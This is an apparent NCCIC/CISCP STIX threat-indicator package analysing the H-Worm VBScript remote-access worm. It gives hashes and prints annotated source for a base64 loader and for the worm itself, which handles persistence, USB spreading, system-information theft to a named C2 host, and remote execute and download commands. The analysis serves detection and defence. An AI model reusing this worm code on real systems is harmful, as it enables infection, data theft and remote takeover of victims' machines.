<stix:STIX_Package xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AIS="http://www.us-cert.gov/STIXMarkingStructure#AISConsentMarking-2" xmlns:CISCP="http://us-cert.gov/ciscp" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:stix-ciq="http://stix.mitre.org/extensions/Identity#CIQIdentity3.0-1" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:xal="urn:oasis:names:tc:ciq:xal:3" xmlns:xnl="urn:oasis:names:tc:ciq:xnl:3" xmlns:xpil="urn:oasis:names:tc:ciq:xpil:3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-14-10426" timestamp="2014-10-03T19:16:07Z" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd   http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd   http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd   http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd   http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd   http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd   http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd   http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd   http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd   http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd   http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd   http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd   http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd   http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd   http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd   http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd   http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd   http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd      http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd   http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd     http://www.us-cert.gov/STIXMarkingStructure#AISConsentMarking-2 http://www.us-cert.gov/sites/default/files/STIX_Namespace/AIS_Bundle_Marking_1.1.1_v1.0.xsd     http://stix.mitre.org/extensions/Identity#CIQIdentity3.0-1 http://stix.mitre.org/XMLSchema/extensions/identity/ciq_3.0/1.1.1/ciq_3.0_identity.xsd     urn:oasis:names:tc:ciq:xpil:3 http://stix.mitre.org/XMLSchema/external/oasis_ciq_3.0/xPIL.xsd">
  <stix:STIX_Header>
    <stix:Title>H-Worm RAT Analysis</stix:Title>
    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
    <stix:Description>During the first half of 2014, two Visual Basic Script files were observed on a server. The files are variants of the H-Worm, a Visual Basic worm, with capabilities to propagate via the use of removable media. The first two files outlined included the two scripts. The third file (MD5: d763d864dfc657da7f80705c2f2babe3) is a decoded version of a variable from the file named ewethxqlug.vbs (MD5: 2fc337753a9a084d1a042af12972a1f0).

Indicators surrounding the H-Worm were previously reported in IB-14-10322.</stix:Description>
    <stix:Handling>
      <marking:Marking>
        <marking:Controlled_Structure>//node() | //@*</marking:Controlled_Structure>
        <marking:Marking_Structure xsi:type="AIS:AISMarkingStructure">
          <AIS:Not_Proprietary CISA_Proprietary="false">
            <AIS:AISConsent consent="EVERYONE"/>
            <AIS:TLPMarking color="GREEN"/>
          </AIS:Not_Proprietary>
        </marking:Marking_Structure>
        <marking:Information_Source>
          <stixCommon:Identity xsi:type="stix-ciq:CIQIdentity3.0InstanceType">
            <stix-ciq:Specification>
              <xpil:PartyName>
                <xnl:OrganisationName>
                  <xnl:NameElement>NCCIC</xnl:NameElement>
                </xnl:OrganisationName>
              </xpil:PartyName>
              <xpil:Addresses>
                <xpil:Address>
                  <xal:Country>
                    <xal:NameElement xal:NameCode="US" xal:NameCodeType="ISO 3166-1 alpha-2"/>
                  </xal:Country>
                  <xal:AdministrativeArea>
                    <xal:NameElement xal:NameCode="US-DC" xal:NameCodeType="ISO 3166-2"/>
                  </xal:AdministrativeArea>
                </xpil:Address>
              </xpil:Addresses>
              <xpil:OrganisationInfo xpil:IndustryType="Information Technology Sector"/>
            </stix-ciq:Specification>
          </stixCommon:Identity>
        </marking:Information_Source>
      </marking:Marking>
    </stix:Handling>
    <stix:Information_Source>
      <stixCommon:Time>
        <cyboxCommon:Produced_Time>2014-10-03T19:16:07Z</cyboxCommon:Produced_Time>
      </stixCommon:Time>
    </stix:Information_Source>
  </stix:STIX_Header>
  <stix:Indicators>
    <stix:Indicator id="CISCP:indicator-aef455b5-e384-4e60-bc78-359362935f79" version="2.1.1" xsi:type="indicator:IndicatorType">
      <indicator:Composite_Indicator_Expression operator="OR">
        <indicator:Indicator idref="CISCP:indicator-48f3a25f-d63f-42b2-81e7-5a509efc1a24"/>
        <indicator:Indicator idref="CISCP:indicator-d3336c87-c2c5-474b-b47d-0407cc4898cd"/>
        <indicator:Indicator idref="CISCP:indicator-80df81f6-5189-447e-8c39-41b11bca14ab"/>
        <indicator:Indicator idref="CISCP:indicator-e71681a1-8858-4c73-a433-8f655a03f2ac"/>
        <indicator:Indicator idref="CISCP:indicator-d0eb0af1-12d7-4c05-b087-480f3c44b583"/>
      </indicator:Composite_Indicator_Expression>
    </stix:Indicator>
    <stix:Indicator id="CISCP:indicator-48f3a25f-d63f-42b2-81e7-5a509efc1a24" version="2.1.1" xsi:type="indicator:IndicatorType">
      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
      <indicator:Description>Within the code, the variable "vNr8t86H3r8U3Oy4wy3q" contains base64 encoded data, and each substring is separated by the "^" delimiter.

The algorithm used splits the base64 encoded data into smaller strings and uses a loop to decode each substring. The decoded values of each string are concatenated into the variable "vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwVwPsx5uL08u07xq1s26O4". The decoded string is then sent to standard output.

Shown below is the content of the script. Analysis of the contents of the base64 encoded content can be found in the file with MD5: d763d864dfc657da7f80705c2f2babe3.

----- BEGIN CODE -----

vNr8t86H3r8U3Oy4wy3q="[large blob of base64 encoded data]"
vNr8t86H3r8U3Oy4wy3q=SPLIT(vNr8t86H3r8U3Oy4wy3q,"^")
FOR vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwV = 0 TO UBOUND(vNr8t86H3r8U3Oy4wy3q) -1
vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwVwPsx5uL08u07xq1s26O4 =
vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwVwPsx5uL08u07xq1s26O4 &amp;
Base64Decode(vNr8t86H3r8U3Oy4wy3q(vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwV))
NEXT
wscript.echo(vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwVwPsx5uL08u07xq1s26O4)

Function Base64Encode(sText)
	Dim oXML, oNode
	Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
	Set oNode = oXML.CreateElement("base64")
	oNode.dataType = "bin.base64"
	oNode.nodeTypedValue =Stream_StringToBinary(sText)
	Base64Encode = oNode.text
	Set oNode = Nothing
	Set oXML = Nothing
End Function

Function Base64Decode(ByVal vCode)
	Dim oXML, oNode
	Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
	Set oNode = oXML.CreateElement("base64")
	oNode.dataType = "bin.base64"
	oNode.text = vCode
	Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
	Set oNode = Nothing
	Set oXML = Nothing
End Function

Function Stream_StringToBinary(Text)
	Const adTypeText = 2
	Const adTypeBinary = 1
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeText
	BinaryStream.CharSet = "us-ascii"
	BinaryStream.Open
	BinaryStream.WriteText Text
	BinaryStream.Position = 0
	BinaryStream.Type = adTypeBinary
	BinaryStream.Position = 0
	Stream_StringToBinary = BinaryStream.Read
	Set BinaryStream = Nothing
End Function

Function Stream_BinaryToString(Binary)
	Const adTypeText = 2
	Const adTypeBinary = 1
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeBinary
	BinaryStream.Open
	BinaryStream.Write Binary
	BinaryStream.Position = 0
	BinaryStream.Type = adTypeText
	BinaryStream.CharSet = "us-ascii"
	Stream_BinaryToString = BinaryStream.ReadText
	Set BinaryStream = Nothing
End Function

-----  END CODE  -----</indicator:Description>
      <indicator:Observable id="CISCP:Observable-218eaade-1fa0-4bff-8499-e93a1a11fbc0">
        <cybox:Object id="CISCP:Object-a4229478-3884-4ad6-a663-d613ccea0f8f">
          <cybox:Properties xsi:type="FileObj:FileObjectType">
            <FileObj:File_Name condition="Equals">ewethxqlug.vbs</FileObj:File_Name>
            <FileObj:Size_In_Bytes condition="Equals">73371</FileObj:Size_In_Bytes>
            <FileObj:Hashes>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
                <cyboxCommon:Simple_Hash_Value condition="Equals">2fc337753a9a084d1a042af12972a1f0</cyboxCommon:Simple_Hash_Value>
              </cyboxCommon:Hash>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
                <cyboxCommon:Simple_Hash_Value condition="Equals">d90993ad7313e501ef7d8c857743a024e414b2e6</cyboxCommon:Simple_Hash_Value>
              </cyboxCommon:Hash>
              <cyboxCommon:Hash>
                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:c0grC+0tLFg0Zc0UzO6bZCDnYnBcIFnwEkh2DvtXwqx9QURnlaAUuKrXGj+r+jBM:7Yvy0U</cyboxCommon:Fuzzy_Hash_Value>
              </cyboxCommon:Hash>
            </FileObj:Hashes>
          </cybox:Properties>
        </cybox:Object>
      </indicator:Observable>
      <indicator:Kill_Chain_Phases>
        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
      </indicator:Kill_Chain_Phases>
      <indicator:Sightings sightings_count="1">
        <indicator:Sighting timestamp="2014-06-24T00:00:00"/>
      </indicator:Sightings>
    </stix:Indicator>
    <stix:Indicator id="CISCP:indicator-d3336c87-c2c5-474b-b47d-0407cc4898cd" version="2.1.1" xsi:type="indicator:IndicatorType">
      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
      <indicator:Description>This file is a malicious Visual Basic script. This worm is capable of performing the following actions:
- maintaining persistence on the system by installing autorun registry keys
- installing a copy of itself on the removable media drive(s) found
- communicating with the command and control (C2) server and performing actions based on the response from the C2

The worm is able to perform the following actions:
a) receive updates from the C2 server
b) uninstall itself
c) download content from the C2 server

----- BEGIN CODE -----

'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=
host = "thescorpionkig.no-ip.org"
port = "7777"
installdir = "%temp%"
Vname = "test"
etat = "-"
z = "winmgmts:{impersonationLevel=impersonate}!\\.\root\"
Dim shellobj
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")


'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=
installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") &amp; "\"
installdir = shellobj.expandenvironmentstrings(installdir) &amp; "\"
if not filesystemobj.folderexists(installdir) then installdir =
shellobj.expandenvironmentstrings("%temp%") &amp; "\"
spliter = "&lt;|&gt;"
sleep = 5000
dim response
dim cmd
dim param
info = ""
usbspreading = ""
dim oneonce

'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
on error resume next
	'main function of the malware
instance 'sub.
	'Creates registry keys and copies malicious script to 2 additional
	'destinations.
	'See sub instance description below for more details.
while true 'infinite loop
install 'sub.
	'Copies itself to any removable drive attached to the system, and creates
	'short-cut to it.
	'See sub install description below for more details.
response = ""
response = post ("is-ready","") 'function.
	'Constructs the POST request by gathering information about the infected
	'system and
	'sends it back to the C2.
cmd = split (response,spliter)
	'parse the response received from the command and control center (C2).
select case cmd (0)
	'perform an action based on the remote server response.
case "excecute"
	'run command received from remote C2 on the victim's machine.
param = cmd (1)
execute param
etat = "vbs run sexcu"
case "update"
		'update the script and run the newer version on the system.
		'the script content is overwritten with the data received
		'from remote server.
	param = cmd (1)
	oneonce.close
	set oneonce = filesystemobj.opentextfile (installdir &amp; installname ,2,
	false)
	oneonce.write param
	oneonce.close
	shellobj.run "wscript.exe //B " &amp; chr(34) &amp; installdir &amp; installname &amp;
	Chr(34)
	wscript.quit
case "uninstall"
		'uninstall the script
	uninstall
Case "send"
		'downloads content from the remote server into a file.
		'Saves this file on the infected machine and runs it.
	param = cmd (1)
	download (param) 'see download function description for more details.
end select

wscript.sleep sleep

wend


sub install
on error resume next
dim lnkobj
dim filename
dim fileicon

upstart
	'enumerate all Drive objects on the system
for each drive in filesystemobj.drives
if drive.isready = true then
if drive.freespace &gt; 0 then
if drive.drivetype = 1 then
lnkobj.iconlocation = fileicon
		'finds removable drives that have free space.
	filesystemobj.copyfile wscript.scriptfullname , drive.path &amp; "\" &amp; installname,true
		'copies malicious script onto the removable drive
		'the path is: [drive_letter]:\[script_name].vbs
	if filesystemobj.fileexists (drive.path &amp; "\" &amp; installname) then filesystemobj.getfile(drive.path &amp; "\" &amp; installname).attributes = 2+4
		'changes file attributes to hidden and system.
	end if
	for each file in filesystemobj.getfolder( drive.path &amp; "\" ).files
			'enumerates every file in the [drive_letter]:\ root.
		if instr (file.name,".") then
		if lcase (split(file.name, ".")
		(ubound(split(file.name, ".")))) &lt;&gt; "lnk" then
			'looks for the files with any extension other then "lnk".
				file.attributes = 2+4
			'changes file attributes to hidden and system.
				if ucase (file.name) &lt;&gt; ucase (installname) then
				filename = split(file.name,".")
				set lnkobj = shellobj.createshortcut (drive.path &amp; "\" &amp; filename (0) &amp; ".lnk")
				'creates link (short-cut)
					lnkobj.targetpath = "cmd.exe"
					lnkobj.workingdirectory = "" 'default.
					lnkobj.arguments = "/c start " &amp; replace(installname," ",
			chrw(34) &amp; " " &amp; chrw(34)) &amp; "&amp;start " &amp;
			replace(file.name," ", chrw(34) &amp; " " &amp; chrw(34))
				&amp;"&amp;exit"
				'the short-cut executes the following command
				'every time it started
				'cmd.exe /c start "[script_name]"&amp;
				'start"[enumerate_file]&amp;exit.
					fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\"
			&amp; shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\."
			&amp; split(file.name, ".")(ubound(split(file.name, ".")))
			&amp; "\")
			&amp; "\defaulticon\")
				if instr (fileicon,",") = 0 then
					lnkobj.iconlocation = file.path
				else
					lnkobj.iconlocation = fileicon
				end if
				lnkobj.save()
			'saves link
				etat = "Spriting"
				End if
			end if
		end if
	next
end If
end If
end if
next
err.clear
end sub 'end of sub install

sub uninstall
on error resume next
dim filename

shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0)
filesystemobj.deletefile startup &amp; installname ,true
filesystemobj.deletefile wscript.scriptfullname ,true

for each drive in filesystemobj.drives
if drive.isready = true then
if drive.freespace &gt; 0 then
if drive.drivetype = 1 then
	for each file in filesystemobj.getfolder ( drive.path &amp; "\").files
		on error resume next
		if instr (file.name,".") then
			if lcase (split(file.name, ".")(ubound(split(file.name, ".")))) &lt;&gt; "lnk" then
				file.attributes = 0
				if ucase (file.name) &lt;&gt; ucase (installname) then
					filename = split(file.name,".")
					filesystemobj.deletefile (drive.path &amp; "\" &amp; filename(0) &amp; ".lnk" )
				else
					filesystemobj.deletefile (drive.path &amp; "\" &amp; file.name)
				end if
			end if
		end if
	next
end if
end if
end if
next
wscript.quit
end sub

function post (cmd ,param)
post = param
httpobj.open "post","http[:]//" &amp; host &amp; ":" &amp; port &amp;"/" &amp; cmd, false
httpobj.setrequestheader "user-agent:",information
	'User-Agent string. "user-agent
httpobj.send param
	'send POST request to the C2
post = httpobj.responsetext
	'return the response from the C2.
end function

Function information
on error resume Next
if inf = "" then
If gtv("Name") = "??" Then
inf = Vname &amp; "_" &amp; hwid &amp; spliter
	'inf = "test" + [volume_serial_number + "&lt;|&gt;"
Else
inf = gtv("Name") &amp; "-" &amp; hwid &amp; spliter
	' inf = [value of registry key "HKCU\Software\scorpion\Name"] +
[volume_serial_number + "&lt;|&gt;"
End If

	inf = inf &amp; shellobj.expandenvironmentstrings("%computername%") &amp; spliter
		'inf = "test"/[value of registry key
		'"HKCU\Software\scorpion\Name"]
		'+ [volume_serial_number + "&lt;|&gt;"
		' + [computer_name] + "&lt;|&gt;"
	inf = inf &amp; shellobj.expandenvironmentstrings("%username%") &amp; spliter
		'inf = "test"/[value of registry key
		'"HKCU\Software\scorpion\Name"]
		'+ [volume_serial_number + "&lt;|&gt;"
		'+ [computer_name] + "&lt;|&gt;" + [user_name] + "&lt;|&gt;"
	set root = getobject("winmgmts:{impersonationlevel=impersonate}
	!\\.\root\cimv2")
	set os = root.execquery ("select * from win32_operatingsystem")
	for each osinfo in os
		inf = inf &amp; osinfo.caption &amp; spliter
			'inf = "test"/[value of registry key
			'"HKCU\Software\scorpion\Name"]
			'+ [volume_serial_number + "&lt;|&gt;"
			'+ [computer_name] + "&lt;|&gt;" + [user_name] + "&lt;|&gt;"
			'+ [OS_name] + "&lt;|&gt;"
		exit for
	next
	inf = inf &amp; "underworld final" &amp; spliter
		'inf = "test"/[value of registry key
		'"HKCU\Software\scorpion\Name"]
		'+ [volume_serial_number + "&lt;|&gt;"
		'+ [computer_name] + "&lt;|&gt;" + [user_name] + "&lt;|&gt;"
		'+ [OS_name] + "&lt;|&gt;" + "underworld final" + "&lt;|&gt;"
	inf = inf &amp; security &amp; spliter
		'inf = "test"/[value of registry key
		'"HKCU\Software\scorpion\Name"]
		'+ [volume_serial_number + "&lt;|&gt;"
		'+ [computer_name] + "&lt;|&gt;" + [user_name] + "&lt;|&gt;"
		'+ [OS_name] + "&lt;|&gt;" + "underworld final" + "&lt;|&gt;"
		'+ [list_of_AV_products_installed_on_the_system_
		'separated_by_comma or "nan-av"] + "&lt;|&gt;" +
	inf = inf &amp; usbspreading &amp; spliter
		'inf = "test"/[value of registry key
		'"HKCU\Software\scorpion\Name"]
		'+ [volume_serial_number + "&lt;|&gt;"
		'+ [computer_name] + "&lt;|&gt;" + [user_name] + "&lt;|&gt;"
		'+ [OS_name] + "&lt;|&gt;" + "underworld final" + "&lt;|&gt;"
		'+ [list_of_AV_products_installed_on_the_system_
		'separated_by_comma or "nan-av"] + "&lt;|&gt;" +
		'+ ["true"/"false"] + "&lt;|&gt;" +
	inf = inf &amp; gtv("Date") &amp; spliter
		'inf = "test"/[value of registry key
		'"HKCU\Software\scorpion\Name"]
		'+ [volume_serial_number + "&lt;|&gt;"
		'+ [computer_name] + "&lt;|&gt;" + [user_name] + "&lt;|&gt;"
		'+ [OS_name] + "&lt;|&gt;" + "underworld final" + "&lt;|&gt;"
		'+ [list_of_AV_products_installed_on_the_system_
		'separated_by_comma or "nan-av"] + "&lt;|&gt;" +
		'+ ["true"/"false"] + "&lt;|&gt;" +
		'+ [value_of_the_"HKCU\Software\scorpion\Date"_registry_key] + "&lt;|&gt;"
	inf = inf &amp; nf &amp; spliter
		'inf = "test"/[value of registry key
		'"HKCU\Software\scorpion\Name"]
		'+ [volume_serial_number + "&lt;|&gt;"
		'+ [computer_name] + "&lt;|&gt;" + [user_name] + "&lt;|&gt;"
		'+ [OS_name] + "&lt;|&gt;" + "underworld final" + "&lt;|&gt;" +
		' + [list_of_AV_products_installed_on_the_system_
		'separated_by_comma or "nan-av"] + "&lt;|&gt;" +
		'+ ["true"/"false"] + "&lt;|&gt;" +
		'+ [value_of_the_"HKCU\Software\scorpion\Date"
		'_registry_key] + "&lt;|&gt;"
		'+ [string_containing_values_enumerated_from_the_
		'"HKLM\SOFTWARE\Microsoft\.NETFramework\Policy"_
		'registry-key/"-"]
	inf = inf &amp; etat
		'inf = "test"/[value of registry key
		'"HKCU\Software\scorpion\Name"]
		'+ [volume_serial_number + "&lt;|&gt;"
		'+ [computer_name] + "&lt;|&gt;" + [user_name] + "&lt;|&gt;"
		'+ [OS_name] + "&lt;|&gt;" + "underworld final" + "&lt;|&gt;"
		'+ [list_of_AV_products_installed_on_the_system_
		'separated_by_comma or "nan-av"] + "&lt;|&gt;" +
		'+ ["true"/"false"] + "&lt;|&gt;"
		'+ [value_of_the_"HKCU\Software\scorpion\Date"
		'_registry_key] + "&lt;|&gt;"
		'+ [string_containing_values_enumerated_from_the_
		'"HKLM\SOFTWARE\Microsoft\.NETFramework\Policy"
		'_registry-key/"-"]
		'+ "-"/"Spriting"
	information = inf
else
	information = inf
end if
end function

sub upstart ()
on error resume Next

	'creates auto-run registry keys.
shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0),
	"wscript.exe //B " &amp; chrw(34) &amp; installdir
	&amp; installname &amp; chrw(34) , "REG_SZ"
	'"HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\
	'[script_name].vbs"="\"wscript.exe /B %temp%\[script_name].vbs\""
	shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\
	currentversion\run\" &amp; split (installname,".")(0),
	"wscript.exe //B " &amp; chrw(34) &amp; installdir
	&amp; installname &amp; chrw(34) , "REG_SZ"
	'HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\
	'[script_name].vbs"="\"wscript.exe /B %temp%\[script_name].vbs\""
		
	'copies malicious script to two (2) locations on the system.
	filesystemobj.copyfile wscript.scriptfullname,installdir &amp;
	installname,true
	'%temp%\[script_name].vbs
	filesystemobj.copyfile wscript.scriptfullname,startup &amp; installname ,true
	'%startup%\[script_name].vbs
		
end sub

function hwid
	'gets the volume's serial number.
on error resume next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!
	\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
	if disk.volumeserialnumber &lt;&gt; "" then
		hwid = disk.volumeserialnumber
		exit for
	end if
next
end function 'end hwnd


function security
	'determines all the AV product installed on the system.
	'If none were found returns "nan-av".
on error resume next

security = ""

set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
	versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) &amp; "."
for x = 1 to ubound (versionstr)
	osversion = osversion &amp; versionstr (i)
next
osversion = eval (osversion)
if osversion &gt; 6 then sc = "securitycenter2" else sc = "securitycenter"

set objsecuritycenter = getobject("winmgmts:\\localhost\root\" &amp; sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

for each objantivirus in colantivirus
	security = security &amp; objantivirus.displayname &amp; " ."
next
if security = "" then security = "nan-av"
end function


function instance
on error resume next
If gtv("date") = "??" Then
	'Creates registry sub-key "HKCU\Software\scorpion\date" if it
	'doesn't exist.
stv "date" , date
End If
If gtv("Name") = "??" Then
	'Create registry sub-key "HKCU\Software\scorpion\Name" if it
	'doesn't exist.
stv "Name" , Vname
End If
If gtv("new") = "??" Then
;Create registry sub-key "HKCU\Software\scorpion\new" if it
	'doesn't exist.
stv "new" , "no"
End If

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" &amp; split (installname,".")(0) &amp; "\")
	'Reads data from the registry
	'HKEY_LOCAL_MACHINE\software\[script_name]\"
if usbspreading = "" then
	'skips whole if statement if "usbspreading" not an empty string
	if lcase ( mid(wscript.scriptfullname,2)) = ":\" &amp; lcase(installname)
		then
			usbspreading = "true"
			shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" &amp;
			split (installname,".")(0) &amp; "\", usbspreading, "REG_SZ"
			'sets the value of the registry sub-key HKEY_LOCAL_MACHINE\software\
			'[script_name]" equal to "true"
			'this is set to true if the path is of the following form:
			'[driver_letter]:\...
		else
			usbspreading = "false"
			shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" &amp;
		split (installname,".")(0) &amp; "\", usbspreading, "REG_SZ"
		'sets the value of the registry sub-key HKEY_LOCAL_MACHINE\software\
		'[script_name]" equal to "false"
		end if
end If

upstart
set scriptfullnameshort = filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort = filesystemobj.getfile (installdir &amp; installname)
If lcase (scriptfullnameshort.shortpath) &lt;&gt;
	lcase (installfullnameshort.shortpath)
	then
	shellobj.run "wscript.exe //B " &amp; chr(34) &amp; installdir &amp; installname &amp; Chr(34)
	wscript.quit
End If
Err.clear
Set oneonce = filesystemobj.opentextfile (installdir &amp; installname ,8,false)
	'checks if the script is able to open the file for reading,
	'if not the script exits.
If err.number &gt; 0 then wscript.quit

End function 'end of instance


Function download (fileurl)
strsaveto = installdir &amp; mid (fileurl, instrrev (fileurl,"\") + 1)
	'contains the path to the content to be downloaded from
	'the remote server.
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "post","http[:]//" &amp; host &amp; ":" &amp; port &amp;"/" &amp; "is-sending" &amp; spliter &amp; fileurl, false
	'creates POST request that downloads the malicious content.
objhttpdownload.send ""
	'sends POST request to the remote system.

	set objfsodownload = createobject ("scripting.filesystemobject")
if objfsodownload.fileexists (strsaveto) then
		'Deletes the file on the local system if it already exist.
	objfsodownload.deletefile (strsaveto)
end if
	if objhttpdownload.status = 200 then
		'downloads malicious content from remote server only
		'if server replied with HTTP 200 OK code.
	dim objstreamdownload
	set objstreamdownload = createobject("adodb.stream")
	with objstreamdownload
		.type = 1
		.open
		.write objhttpdownload.responsebody
			'gets just the response body.
		.savetofile strsaveto
			'saves downloaded content directly into the file on
			'the local system.
		.close
	end with
	set objstreamdownload = nothing
end if
if objfsodownload.fileexists (strsaveto) then
		'runs the file .
	shellobj.run strsaveto
	etat = "Run File donnee"
end if
end Function 'end of function download

Function nf
	'enumerates registry "HKLM\SOFTWARE\Microsoft\.NETFramework\Policy"
	'Any of the sub-keys that contains "v" are concatenated into large
	'string where entries separated by
	'the space (0x20). The resulting string is returned.
	'If no entries found the function returns "-".
On Error Resume next
Set oReg = GetObject(z &amp; "default:StdRegProv")
Dim aSub, sKey , v
oReg.EnumKey &amp;H80000002,"SOFTWARE\Microsoft\.NETFramework\Policy", aSub
For Each sKey In aSub
	If InStr(sKey,"v") &gt; 0 Then
	v = v &amp; " " &amp; sKey
	End if
Next
nf = nf &amp; v
If nf = "" Then
nf = "-"
End If
End Function 'end of function nf.

Function stv(nm ,vl)
On Error Resume Next
shellobj.RegWrite "HKCU\Software\scorpion\" &amp; nm ,vl, "REG_SZ"
end Function

Function gtv(nm)
On Error Resume Next
gtv = shellobj.RegRead ("HKCU\Software\scorpion\" &amp; nm)
If gtv = "" Then
gtv = "??"
End If
End Function
-----  END CODE  -----</indicator:Description>
